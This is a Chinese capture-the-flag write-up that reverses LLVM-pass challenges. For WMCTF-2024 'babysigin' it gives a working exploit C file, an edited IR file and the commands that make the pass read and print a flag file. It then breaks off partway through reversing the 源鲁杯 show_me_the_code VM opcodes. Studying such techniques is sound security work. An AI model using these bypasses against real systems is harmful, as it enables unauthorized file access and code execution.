ll文件中常见变量的理解
============

```text
@ - 全局变量
% - 局部变量
alloca - 在当前执行的函数的堆栈帧中分配内存，当该函数返回到其调用者时，将自动释放内存
i32 - 32位4字节的整数
align - 对齐
load - 读出，store写入
icmp - 两个整数值比较，返回布尔值
br - 选择分支，根据条件来转向label，不根据条件跳转的话类型goto
label - 代码标签
call - 调用函数
```

例题WMCTF-2024 babysigin
======================

**很重要的一些理解**
------------

```text
CallInst：函数类型的变量
LoadInst：ll中应对应load指令
StoreInst：ll中应对应store指令
llvm::dyn_cast：这种就是判断其是否是GlobalVariable/LoadInst/StoreInst类型
```

有关LoadInst
----------

发现想要满足LoadInst类型，那么传入的不应该是个直接的值，而是先int cmd=1234,func(cmd)用这种方式传参即可  
再详细解释一下LoadInst，比如我的exp.c中是这样的

```c
WMCTF_WRITE(0x8888);
```

那么ll文件就会是这样,显然不满足load

```ll
call void @WMCTF_WRITE(i32 noundef 34952)
```

但如果先定义一个变量再传参

```c
int cmd = 0x8888;
WMCTF_WRITE(cmd);
```

那么ll文件就长这样

```ll
@cmd = dso_local global i32 34952, align 4
%1 = load i32, i32* @cmd, align 4
call void @WMCTF_WRITE(i32 noundef %1)
```

**显然这样就满足load类型了！！！**

有关StoreInst
-----------

- 这部分和LoadInst类似，可以在WMCTF\_OPEN分析中的最后一关这部分看到如何解决

这里先看简单的 WMCTF\_OPEN 和 WMCTF\_READ
---------------------------------

```c
v77 = llvm::ilist_iterator,false,false&gt;::operator*(&amp;v79);
//v76变成CallInst类型
v76 = (llvm::CallBase *)llvm::dyn_cast(v77);
//********************************************WMCTF_READ***************************************************
v19 = (llvm::Value *)llvm::CallBase::getCalledFunction(v76);
//得到函数名称
v55 = llvm::Value::getName(v19);
v56 = v20;
llvm::StringRef::StringRef((llvm::StringRef *)v54, "WMCTF_READ");
if ( (llvm::operator==(v55, v56, v54[0], v54[1]) &amp; 1) != 0 )
{
  //得到函数的第0个参数
  v21 = llvm::CallBase::getOperand(v76, 0);
  //将这个参数转换为ConstantInt类型
  v53 = (llvm::ConstantInt *)llvm::dyn_cast(v21);
  if ( v53 &amp;&amp; llvm::ConstantInt::getSExtValue(v53) == 0x6666 )
  {
    v22 = (llvm *)fd;
    if ( read(fd, (void *)mmap_addr, 0x40uLL) &lt; 0 )
    {
      v23 = llvm::errs(v22);
      llvm::raw_ostream::operator&lt;&lt;(v23, "WMCTF_READ error\n");
      v86 = 0;
      return v86 &amp; 1;
    }
    v24 = llvm::errs(v22);
    llvm::raw_ostream::operator&lt;&lt;(v24, "WMCTF_READ success\n");
  }
}
//***********************************************WMCTF_MMAP****************************************
//与WMCTF_READ类似不再做分析
v25 = (llvm::Value *)llvm::CallBase::getCalledFunction(v76);
v51 = llvm::Value::getName(v25);
v52 = v26;
llvm::StringRef::StringRef((llvm::StringRef *)v50, "WMCTF_MMAP");
if ( (llvm::operator==(v51, v52, v50[0], v50[1]) &amp; 1) != 0 )
{
v27 = llvm::CallBase::getOperand(v76, 0);
v49 = (llvm::ConstantInt *)llvm::dyn_cast(v27);
if ( v49 &amp;&amp; llvm::ConstantInt::getSExtValue(v49) == 0x7890 )
{
  mmap_addr = mmap(0LL, 0x1000uLL, 3, 33, 0, 0LL);
  if ( mmap_addr == (const void *)-1LL )
  {
    v28 = llvm::errs(0LL);
    llvm::raw_ostream::operator&lt;&lt;(v28, "WMCTF_MMAP failed\n");
  }
  else
  {
    v29 = llvm::errs(0LL);
    llvm::raw_ostream::operator&lt;&lt;(v29, "WMCTF_MMAP success\n");
  }
}
}
```

- **分析完后发现WMCTF\_OPEN 和 WMCTF\_READ只要正常传参就行**

再看WMCTF\_WRITE
--------------

```c
v30 = (llvm::Value *)llvm::CallBase::getCalledFunction(v76);
v47 = llvm::Value::getName(v30);
v48 = v31;
llvm::StringRef::StringRef((llvm::StringRef *)v46, "WMCTF_WRITE");
if ( (llvm::operator==(v47, v48, v46[0], v46[1]) &amp; 1) != 0 )
{
  //获取函数的第0个参数
  v32 = llvm::CallBase::getOperand(v76, 0);
  //判断这个参数是否是LoadInst类型
  v45 = (llvm::UnaryInstruction *)llvm::dyn_cast(v32);
  if ( !v45 )
  {
    v86 = 0;
    return v86 &amp; 1;
  }
  //从LoadInst中获取第一个参数，判断其是否是全局变量
  v33 = llvm::UnaryInstruction::getOperand(v45, 0);
  v44 = (llvm::GlobalVariable *)llvm::dyn_cast(v33);
  if ( !v44 )
  {
    v86 = 0;
    return v86 &amp; 1;
  }
  //是全局变量再从GlobalVariable获的第一个参数
  v34 = llvm::GlobalVariable::getOperand(v44, 0);
  //将获得的参数值转换为ConstantInt类型
  v43 = (llvm::ConstantInt *)llvm::dyn_cast(v34);
  if ( v43 )
  {
    if ( (unsigned int)llvm::ConstantInt::getSExtValue(v43) != 0x8888 )
    {
      v86 = 0;
      return v86 &amp; 1;
    }
    if ( write((int)&amp;dword_0 + 1, mmap_addr, 0x40uLL) &lt; 0 )
    {
      v35 = llvm::errs((llvm *)((char *)&amp;dword_0 + 1));
      llvm::raw_ostream::operator&lt;&lt;(v35, "WMCTF_WRITE error\n");
      v86 = 0;
      return v86 &amp; 1;
    }
  }
}
```

- **分析完后发现WMCTF\_WRITE传入的参数在ll中应当是load指令的结果，同时这个参数得是个全局变量**
- ll文件中应当长这样

```ll
@cmd = dso_local global i32 34952, align 4

%1 = load i32, i32* @cmd, align 4
call void @WMCTF_WRITE(i32 noundef %1)
```

最后看WMCTF\_OPEN
--------------

- 先过第一关

```c
CalledFunction = (llvm::Value *)llvm::CallBase::getCalledFunction(v76);
Name = llvm::Value::getName(CalledFunction);
v75 = v3;
llvm::StringRef::StringRef((llvm::StringRef *)v73, "WMCTF_OPEN");
if ( (llvm::operator==(Name, v75, v73[0], v73[1]) &amp; 1) != 0 )
{
  //获取函数的0个参数，判断是否是LoadInst类型
  Operand = llvm::CallBase::getOperand(v76, 0);
  if ( (llvm::isa(&amp;Operand) &amp; 1) == 0 )
  {
    v4 = llvm::errs((llvm *)&amp;Operand);
    llvm::raw_ostream::operator&lt;&lt;(v4, "parameter error: first operand is not a LoadInst\n");
    v86 = 0;
    return v86 &amp; 1;
  }
  //也是获取函数的第0个参数，但是和上面类似有点不同，笔者这里不懂，但是只要保证WMCTF_OPEN的参数是load类型就行
  v5 = (llvm *)llvm::CallBase::getOperand(v76, 0);
  v71 = (llvm::UnaryInstruction *)llvm::dyn_cast(v5);
  if ( !v71 )
  {
    v6 = llvm::errs(v5);
    llvm::raw_ostream::operator&lt;&lt;(v6, "parameter error: filename is not a LoadInst\n");
    v86 = 0;
    return v86 &amp; 1;
  }
  //获取LoadInst的第0个参数
  v70 = (llvm::Value *)llvm::UnaryInstruction::getOperand(v71, 0);
  //获取参数的名字
  /*
  这里打个比方
  %3 = load i8*, i8** @filename, align 8
  v70 = (llvm::Value *)llvm::UnaryInstruction::getOperand(v71, 0);就相当于获取和@filename有关的东西
  那么llvm::Value::getName(v70);就是或者上述内容的名字，也就是filename
  在exp.c中这就是char *filename = "./flag";但是我们知道变量的命名不能带. 所以这里我们只能自己手动改ll文件
  */
  v69[0] = llvm::Value::getName(v70);
  v69[1] = v7;
  llvm::StringRef::StringRef((llvm::StringRef *)v68, ".addr");
  if ( (llvm::StringRef::contains(v69, v68[0], v68[1]) &amp; 1) == 0 )
  {
    v8 = llvm::errs((llvm *)v69);
    llvm::raw_ostream::operator&lt;&lt;(v8, "parameter error: filepath does not contain .addr\n");
    v86 = 0;
    return v86 &amp; 1;
  }
}
```

- 再过第二关,可以看到这个open实际上就是根据v66这个字符串的值来open，因此这个WMCTF::getFunctionCallValue\[abi:cxx11\]将是我们分析的重点

```c
anonymous namespace::WMCTF::getFunctionCallValue[abi:cxx11]((llvm *)v66, (__int64)this, Parent, v84, 0);
if ( (std::string::empty(v66) &amp; 1) != 0 )
{
  v9 = llvm::errs((llvm *)v66);
  llvm::raw_ostream::operator&lt;&lt;(v9, "function error: could not retrieve function call value\n");
  v86 = 0;
  v65 = 1;
}
else
{
  Context = llvm::Module::getContext(Parent);
  llvm::StringRef::StringRef(v63, v66);
  v10 = v63[0];
  String = (llvm::Value *)llvm::ConstantDataArray::getString(Context, v63[0], v63[1], 0LL);
  v41 = llvm::GlobalVariable::operator new((llvm::GlobalVariable *)&amp;qword_58, v10);
  v38 = Parent;
  Type = llvm::Value::getType(String);
  v40 = String;
  v11 = rand();
  std::to_string((std::__cxx11 *)v59, v11);
  std::operator+(v60, "string_constant", v59);
  llvm::Twine::Twine(v61, v60);
  llvm::Optional::Optional(&amp;v58, 1LL);
  llvm::GlobalVariable::GlobalVariable(v41, v38, Type, 1LL, 8LL, v40, v61, 0LL, 0, v58, 0);
  std::string::~string(v60);
  std::string::~string(v59);
  v62 = v41;
  v12 = llvm::Module::getContext(Parent);
  Int8PtrTy = llvm::Type::getInt8PtrTy(v12, 0LL);
  BitCast = (llvm::Value *)llvm::ConstantExpr::getBitCast(v41, Int8PtrTy, 0LL);
  llvm::CallBase::setArgOperand(v76, 0, BitCast);
  v14 = (char *)std::string::c_str(v66);
  fd = open(v14, 0);
  if ( (fd &amp; 0x80000000) == 0 )
  {
    v18 = llvm::errs((llvm *)v14);
    llvm::raw_ostream::operator&lt;&lt;(v18, "WMCTF_OPEN success\n");
    v65 = 0;
  }
  else
  {
    v15 = llvm::errs((llvm *)v14);
    v16 = llvm::raw_ostream::operator&lt;&lt;(v15, "open error: could not open file ");
    v17 = llvm::raw_ostream::operator&lt;&lt;(v16, v66);
    llvm::raw_ostream::operator&lt;&lt;(v17, "\n");
    v86 = 0;
    v65 = 1;
  }
}
std::string::~string(v66);
if ( v65 )
  return v86 &amp; 1;

```

- 最后一关

```c
llvm *__fastcall anonymous namespace::WMCTF::getFunctionCallValue[abi:cxx11](
        llvm *a1,
        __int64 a2,
        llvm::Module *a3,
        llvm::Value *a4,
        int a5)
{
  __int64 v5; // rax
  llvm::Value *CalledFunction; // rax
  __int64 v7; // rdx
  __int64 v8; // rdx
  __int64 Operand; // rax
  llvm::Value *v10; // rax
  __int64 v11; // rdx
  __int64 v12; // rax
  __int64 v13; // rax
  __int64 v14; // rdx
  __int64 User; // rax
  __int64 v16; // rax
  __int64 v17; // rax
  __int64 Initializer; // rax
  __int64 v19; // rdx
  char v21[8]; // [rsp+20h] [rbp-150h] BYREF
  __int64 v22[2]; // [rsp+28h] [rbp-148h] BYREF
  llvm::ConstantDataSequential *v23; // [rsp+38h] [rbp-138h]
  llvm::GlobalVariable *v24; // [rsp+40h] [rbp-130h]
  llvm::ConstantExpr *v25; // [rsp+48h] [rbp-128h]
  llvm::StoreInst *v26; // [rsp+50h] [rbp-120h]
  llvm::Use *v27; // [rsp+58h] [rbp-118h]
  __int64 v28; // [rsp+60h] [rbp-110h] BYREF
  __int64 v29; // [rsp+68h] [rbp-108h] BYREF
  __int64 v30[2]; // [rsp+70h] [rbp-100h] BYREF
  __int64 *v31; // [rsp+80h] [rbp-F0h]
  llvm::Value *v32; // [rsp+88h] [rbp-E8h]
  char v33[8]; // [rsp+90h] [rbp-E0h] BYREF
  __int64 v34[2]; // [rsp+98h] [rbp-D8h] BYREF
  __int64 v35[2]; // [rsp+A8h] [rbp-C8h] BYREF
  llvm::UnaryInstruction *v36; // [rsp+B8h] [rbp-B8h]
  __int64 v37; // [rsp+C0h] [rbp-B0h]
  __int64 v38; // [rsp+C8h] [rbp-A8h]
  __int64 Name; // [rsp+D0h] [rbp-A0h]
  __int64 v40; // [rsp+D8h] [rbp-98h]
  llvm::CallBase *v41; // [rsp+E0h] [rbp-90h]
  __int64 v42; // [rsp+E8h] [rbp-88h]
  __int64 v43; // [rsp+F0h] [rbp-80h] BYREF
  __int64 v44; // [rsp+F8h] [rbp-78h] BYREF
  llvm::BasicBlock *v45; // [rsp+100h] [rbp-70h]
  llvm::BasicBlock *v46; // [rsp+108h] [rbp-68h]
  __int64 v47; // [rsp+110h] [rbp-60h] BYREF
  __int64 v48; // [rsp+118h] [rbp-58h] BYREF
  llvm::Function *v49; // [rsp+120h] [rbp-50h]
  llvm::Value *v50; // [rsp+128h] [rbp-48h]
  __int64 v51; // [rsp+130h] [rbp-40h] BYREF
  __int64 v52[2]; // [rsp+138h] [rbp-38h] BYREF
  char v53[4]; // [rsp+148h] [rbp-28h] BYREF
  unsigned int v54; // [rsp+14Ch] [rbp-24h]
  llvm::Value *v55; // [rsp+150h] [rbp-20h]
  llvm::Module *v56; // [rsp+158h] [rbp-18h]
  __int64 v57; // [rsp+160h] [rbp-10h]
  llvm *v58; // [rsp+168h] [rbp-8h]

  v58 = a1;
  v57 = a2;
  v56 = a3;
  v55 = a4;
  v54 = a5;
  if ( a5 &lt;= 5 )
  {
    v52[1] = (__int64)v56;
    v52[0] = llvm::Module::begin(v56);
    v51 = llvm::Module::end(v56);
    while ( (llvm::operator!=(v52, &amp;v51) &amp; 1) != 0 )
    {
      v50 = (llvm::Value *)llvm::ilist_iterator,false,false&gt;::operator*(v52);
      v49 = v50;
      v48 = llvm::Function::begin(v50);
      v47 = llvm::Function::end(v49);
      while ( (llvm::operator!=(&amp;v48, &amp;v47) &amp; 1) != 0 )
      {
        v46 = (llvm::BasicBlock *)llvm::ilist_iterator,false,false&gt;::operator*(&amp;v48);
        v45 = v46;
        v44 = llvm::BasicBlock::begin(v46);
        v43 = llvm::BasicBlock::end(v45);
        //进入遍历list的过程
        while ( (llvm::operator!=(&amp;v44, &amp;v43) &amp; 1) != 0 )
        {                                    
          v42 = llvm::ilist_iterator,false,false&gt;::operator*(&amp;v44);

          v41 = (llvm::CallBase *)llvm::dyn_cast(v42);
          if ( v41 )
          {
            //获得函数名称
            CalledFunction = (llvm::Value *)llvm::CallBase::getCalledFunction(v41);
            Name = llvm::Value::getName(CalledFunction);
            v40 = v7;
            v37 = llvm::Value::getName(v55);
            v38 = v8;
            if ( (llvm::operator==(Name, v40, v37, v8) &amp; 1) != 0 )
            {
              //获得函数第一个参数
              Operand = llvm::CallBase::getOperand(v41, 0);
              //变成LoadInst类型
              v36 = (llvm::UnaryInstruction *)llvm::dyn_cast(Operand);
              if ( v36 )
              {
                //获得LoadInst类型的第一个参数
                v10 = (llvm::Value *)llvm::UnaryInstruction::getOperand(v36, 0);
                v35[0] = llvm::Value::getName(v10);
                v35[1] = v11;
                //判断LoadInst类型的第一个参数是否包含.addr，这里要手动改
                llvm::StringRef::StringRef((llvm::StringRef *)v34, ".addr");
                if ( (llvm::StringRef::contains(v35, v34[0], v34[1]) &amp; 1) != 0 )
                {
                  //进行这个函数的递归，v54初值为0
                  anonymous namespace::WMCTF::getFunctionCallValue[abi:cxx11](a1, a2, v56, v50, v54 + 1);
                  return a1;
                }
                //0，1，2，3，第3次函数调用应当不包含.addr（从第0次开始计数），防止进入if语句
                if ( v54 != 3 )
                {
                  v12 = llvm::errs((llvm *)v35);
                  v13 = llvm::raw_ostream::operator&lt;&lt;(v12, v54);
                  llvm::raw_ostream::operator&lt;&lt;(v13, "\n");
                  std::allocator::allocator(v33);
                  std::string::basic_string(a1, "", v33);
                  std::allocator::~allocator(v33);
                  return a1;
                }
                //这下面一大段步骤都是获取LoadInst类型的第0个参数，然后把它复制到a1,也就是刚才的v66中
                v32 = (llvm::Value *)llvm::UnaryInstruction::getOperand(v36, 0);
                v30[0] = llvm::Value::uses(v32);
                v30[1] = v14;
                v31 = v30;
                v29 = llvm::iterator_range&gt;::begin(v30);
                v28 = llvm::iterator_range&gt;::end(v31);
                while ( (llvm::Value::use_iterator_impl::operator!=(&amp;v29, &amp;v28) &amp; 1) != 0 )
                {
                  v27 = (llvm::Use *)llvm::Value::use_iterator_impl::operator*(&amp;v29);
                  User = llvm::Use::getUser(v27);
                  //User要是StoreInst类型，一直向上溯源发现是和v32有关，v32是LoadInst类型的第0个参数
                  //说明LoadInst类型的第0个参数应该又是个StoreInst，怎么做到呢?
                  //利用flag="./flag"这种赋值，然后再调用 func3(flag);这种传参就可以做到
                  v26 = (llvm::StoreInst *)llvm::dyn_cast(User);
                  if ( v26 )
                  {
                    v16 = llvm::StoreInst::getOperand(v26, 0);
                    v25 = (llvm::ConstantExpr *)llvm::dyn_cast(v16);
                    if ( v25 )
                    {
                      v17 = llvm::ConstantExpr::getOperand(v25, 0);
                      v24 = (llvm::GlobalVariable *)llvm::dyn_cast(v17);
                      if ( v24 )
                      {
                        Initializer = llvm::GlobalVariable::getInitializer(v24);
                        v23 = (llvm::ConstantDataSequential *)llvm::dyn_cast(Initializer);
                        if ( v23 )
                        {
                          v22[0] = llvm::ConstantDataSequential::getAsString(v23);
                          v22[1] = v19;
                          llvm::StringRef::str[abi:cxx11](a1, v22);
                          return a1;
                        }
                      }
                    }
                  }
                  llvm::Value::use_iterator_impl::operator++(&amp;v29);
                }
              }
            }
          }
          llvm::ilist_iterator,false,false&gt;::operator++(&amp;v44);
        }
        llvm::ilist_iterator,false,false&gt;::operator++(&amp;v48);
      }
      llvm::ilist_iterator,false,false&gt;::operator++(v52);
    }
    std::allocator::allocator(v21);
    std::string::basic_string(a1, "", v21);
    std::allocator::~allocator(v21);
  }
  else
  {
    v5 = llvm::errs(a1);
    llvm::raw_ostream::operator&lt;&lt;(v5, "error: recursion depth exceeded\n");
    std::allocator::allocator(v53);
    std::string::basic_string(a1, "", v53);
    std::allocator::~allocator(v53);
  }
  return a1;
}
```

- 要注意的地方，v26 = (llvm::StoreInst \*)llvm::dyn\_cast(User); 注意看代码中的分析部分，具体是是用以下方式实现

```c
void func4(char *name) {
        flag = "./flag";
        func3(flag);
}
```

exp
---

- exp.c

```c
void WMCTF_OPEN(char *name);
void WMCTF_READ(int cmd);
void WMCTF_MMAP(int cmd);
void WMCTF_WRITE(int cmd);
char *filename = "./flag";
char *flag = "./flag";
int cmd = 0x8888;
void f0(char* name);
void f1(char* name);
void f2(char* name);
void f3(char* name);

void func0(char *name) {
        WMCTF_OPEN(filename);
}

void func1(char* name) {
        func0(filename);
}

void func2(char* name) {
        func1(filename);
}

void func3(char *name) {

        func2(filename);
}

void func4(char *name) {
        flag = "./flag";
        func3(flag);
}

void funcmain() {
    WMCTF_MMAP(0x7890);
    WMCTF_READ(0x6666);
    WMCTF_WRITE(cmd);
}
```

- 修改过后的ll文件，主要就是把filename这个名称变为.addr，其他的无需改动

```ll
; ModuleID = 'test.c'
source_filename = "test.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

@.str = private unnamed_addr constant [7 x i8] c"./flag\00", align 1
@.addr = dso_local global i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0), align 8
@flag = dso_local global i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0), align 8
@cmd = dso_local global i32 34952, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @func0(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** @.addr, align 8
  call void @WMCTF_OPEN(i8* noundef %3)
  ret void
}

declare void @WMCTF_OPEN(i8* noundef) #1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @func1(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** @.addr, align 8
  call void @func0(i8* noundef %3)
  ret void
}

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @func2(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** @.addr, align 8
  call void @func1(i8* noundef %3)
  ret void
}

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @func3(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** @.addr, align 8
  call void @func2(i8* noundef %3)
  ret void
}

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @func4(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0), i8** @flag, align 8
  %3 = load i8*, i8** @flag, align 8
  call void @func3(i8* noundef %3)
  ret void
}

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @funcmain() #0 {
  call void @WMCTF_MMAP(i32 noundef 30864)
  call void @WMCTF_READ(i32 noundef 26214)
  %1 = load i32, i32* @cmd, align 4
  call void @WMCTF_WRITE(i32 noundef %1)
  ret void
}

declare void @WMCTF_MMAP(i32 noundef) #1

declare void @WMCTF_READ(i32 noundef) #1

declare void @WMCTF_WRITE(i32 noundef) #1

attributes #0 = { noinline nounwind optnone uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"Ubuntu clang version 14.0.0-1ubuntu1.1"}

```

- 相关sh脚本

```bash
opt -load ./WMCTF.so -WMCTF -enable-new-pm=0 ./test.ll

clang -emit-llvm -S test.c -o test.ll
```

- 至此就打通了

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-fceaf639289c74b835b5e02f63fac959d82ac6fa.png)

后记与反思
-----

笔者还剩一处没有懂的地方，就是这里的递归调用次数，这里笔者认为的递归次数比实际exp少1，但是通过调试发现只有exp这种形式才打得通，目前尚未解决这个问题

```c
if ( (llvm::StringRef::contains(v35, v34[0], v34[1]) &amp; 1) != 0 )
{
  //进行这个函数的递归，v54初值为0
  anonymous namespace::WMCTF::getFunctionCallValue[abi:cxx11](a1, a2, v56, v50, v54 + 1);
  return a1;
}
//0，1，2，3，第3次函数调用应当不包含.addr（从第0次开始计数），防止进入if语句
```

在打WMCTF的时候此题最主要卡的地方是LoadInst这个东西，因为笔者逆向能力不是很强，所以想通过pwndbg调试查看执行流程以及堆栈情况看看函数在做些什么，但对于这个复杂的过程，动调真的很难看懂，看来看去就看到开辟了好复杂的堆空间，对解题没有一点帮助。

最终解决LoadInst是在尝试的过程中，偶然发现什么时候会出现load和store这两种指令，然后根据逆向的猜测，发现实际情况确实如此，再结合getOperand这个函数，推测LoadInst，StoreInst和CallInst类似，也是可以获取它的第几个参数（但一般都是第0个），从而豁然开朗，明白如何绕过这些条件判断控制流程

要加强逆向能力，要有耐心逆向，逆不出来多搜索，能否找到相近源码，或者不明白具体哪一个函数，网上搜搜是否有对应解答，都能帮助逆向。ida有时候看代码不方便，可以放到vscode里面帮助阅读。想要仅靠动调就明白函数的具体作用，笔者认为是很难的。总之逆向是一种综合能力的体现，多练，耐心，才能增强逆向能力。

源鲁杯-2024 show\_me\_the\_code
============================

逆向分析
----

这部分可以说是llvm中最花时间的阶段了，只有逆向过了交互，才能懂得漏洞如何利用

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-06ec6fb27e7fc7b730f1d7101de3941468a69f6f.png)

secret::init
------------

主要功能是得到vmkey的值，然后mmap出一段地址,reg\[6\]=mmap\_addr,reg\[7\]=mmap\_addr+0x1000。我大致逆向了一下里面的东西，基本就是涉及xor,sm4,base64,rc4一些算法，直接逆向得到这些key也可以，但是还得保证一部分不出错才行。所以这时候来了一个简单的方法--动态调试!!!

**直接通过动调看运行时vmkey的值，然后又因为这些加解密操作的数值是固定的，所以vmkey的值也是固定的，因此可以直接动调看出来，vmkey=detlfyiruby1145#**

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-8565019757c3a02d3e00f639fa14d06df59149bc.png)

验证是否是main入口
-----------

这部分动调的时候看了一下就是判断是不是main入口，是的话才执行下面的c0oo0o0Ode::vmRun(this, v9);

同理，这里也可以动调看出来这个值是什么，最终发现是**\_Z10c0deVmMainv**这个

```c
VMDatProt::getStrFromProt2(
    (__int64)v5,
    (__int64)&anonymous namespace::vmFuncName[abi:cxx11],
    (__int64)&secret::vmKey[abi:cxx11]);
llvm::StringRef::StringRef(v6, v5);
v4 = llvm::operator==(Name, v8, v6[0], v6[1]);
std::string::~string(v5);
```

执行函数前的验证-isValidOp函数
--------------------

**首先根据anonymous namespace::ops\[abi:cxx11\]取出对应的值，然后用vmkey来进行解密，判断函数名是否和给定的一致**

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-a0389f8478563daf3a6ad5bdbf9990e42ba17276.png)

**一致后进入isValidEnv函数**

```c
__int64 __fastcall anonymous namespace::c0oo0o0Ode::isValidEnv(__int64 a1, __int64 a2)
{
  __int64 Type; // rax
  __int64 v3; // rdx
  char v5; // [rsp+7h] [rbp-C9h]
  char v6[32]; // [rsp+8h] [rbp-C8h] BYREF
  char v7[8]; // [rsp+28h] [rbp-A8h] BYREF
  char v8[32]; // [rsp+30h] [rbp-A0h] BYREF
  char v9[32]; // [rsp+50h] [rbp-80h] BYREF
  __int64 v10[2]; // [rsp+70h] [rbp-60h] BYREF
  __int64 StructName; // [rsp+80h] [rbp-50h]
  __int64 v12; // [rsp+88h] [rbp-48h]
  llvm::Type *v13; // [rsp+90h] [rbp-40h]
  llvm::Type *ElementType; // [rsp+98h] [rbp-38h]
  llvm::PointerType *v15; // [rsp+A0h] [rbp-30h]
  llvm::Value *ArgOperand; // [rsp+A8h] [rbp-28h]
  llvm::CallBase *v17; // [rsp+B0h] [rbp-20h]
  __int64 v18; // [rsp+B8h] [rbp-18h]
  __int64 v19; // [rsp+C0h] [rbp-10h]
  char v20; // [rsp+CFh] [rbp-1h]

  v19 = a1;
  v18 = a2;
  v17 = (llvm::CallBase *)llvm::dyn_cast<llvm::CallInst,llvm::ilist_iterator<llvm::ilist_detail::node_options<llvm::Instruction,false,false,void>,false,true>>(a2);
  if ( !v17 )
    goto LABEL_6;
  ArgOperand = (llvm::Value *)llvm::CallBase::getArgOperand(v17, 0); //获得第一个参数
  Type = llvm::Value::getType(ArgOperand);  //得到参数类型
  v15 = (llvm::PointerType *)llvm::dyn_cast<llvm::PointerType,llvm::Type>(Type); //PointerType显然是要是个指针类型
  if ( !v15 )
    goto LABEL_6;
  ElementType = (llvm::Type *)llvm::PointerType::getElementType(v15); //再根据指针获得元素类型
  if ( (llvm::Type::isStructTy(ElementType) & 1) == 0 )   //判断元素是不是个结构体
    goto LABEL_6;
  v13 = (llvm::Type *)llvm::cast<llvm::StructType,llvm::Type>(ElementType);
  StructName = llvm::Type::getStructName(v13);   //得到结构体的名称
  v12 = v3;
  std::allocator<char>::allocator(v7);
  //判断结构体的名称是不是class.edoc
  std::string::basic_string(v8, "class.", v7);
  VMDatProt::getStrFromProt2(
    (__int64)v6,
    (__int64)&anonymous namespace::vmEnvName[abi:cxx11],
    (__int64)&secret::vmKey[abi:cxx11]);
  std::operator+<char>(v9, v8, v6);             // v9="class.edoc"
  llvm::StringRef::StringRef(v10, v9);
  v5 = llvm::operator==(StructName, v12, v10[0], v10[1]);
  std::string::~string(v9);
  std::string::~string(v6);
  std::string::~string(v8);
  std::allocator<char>::~allocator(v7);
  if ( (v5 & 1) != 0 )
    v20 = 1;
  else
LABEL_6:
    v20 = 0;
  return v20 & 1;
}
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-21b1786c2c39222b26011b487df9c0705ee5a629.png)

最终逆向结果
------

isValidOp函数执行后就是执行每个opcode了，但是还有个地方要注意

**这里的llvm::Type::isIntegerTy(Type, 8u)这里的8是指8位，也就是char型，我一开始以为是8个字节，查阅资料后才知道错了。而且从上面的变量定义也可以看到是unsigned char类型**

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-8ed6cd8a51f4add2e7d7e88bb26169fa93460b44.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-c12960a9d7c0e7070337a267839150b82fb17ee7.png)  
**这里的函数名都是一个个动调的时候看实际被加载时是什么名称就可以了**

最终结果如下

```c
#include <stdbool.h>

struct opcode{
    int op0;
} *op;
//之后再把struct.opcode全部替换为class.edoc

void _ZN4edoc4addiEhii(struct opcode *op1,char num,int v1,int v2); //op1  reg[num]=unsigned int(v1+v2)  0<=num<=5
void _ZN4edoc4chgrEhi(struct opcode *op2,char num,int v); //op2  只可以用一次 reg[num]+=v  -4096<v<4096 
void _ZN4edoc4sftrEhbh(struct opcode *op3,char num,bool type,char shift);//op3   type=1:*reg[num]<<shift 或者  type=0:*reg[num]>>shift  0<=num<=5  0<shift<64
void _ZN4edoc4borrEhhh(struct opcode * op4,char a1,char a2,char a3);//op4   reg[a1]=reg[a2]|reg[a3]   a1,a2,a3  0<=x<=5
void _ZN4edoc4movrEhh(struct opcode *op5,char a1,char a2);//op5   reg[a1]=reg[a2]  0<=x<=7  可以涉及到mmap_addr
void _ZN4edoc4saveEhj(struct opcode * op6,char num,int offset);//op6    offset&7==0(8字节对齐)    *(reg[6]+offset)=reg[num]  0<=num<=5
void _ZN4edoc4loadEhj(struct opcode * op7,char num,int offset);//op7    offset&7==0(8字节对齐)     reg[num]=*(reg[6]+offset) 0<=num<=5  offset>=0
void _ZN4edoc4runcEhj(struct opcode * op8,char num,int offset);//op8   func=*(reg[6]+offset)   call func(reg[num])   offset>=0
```

题目分析
----

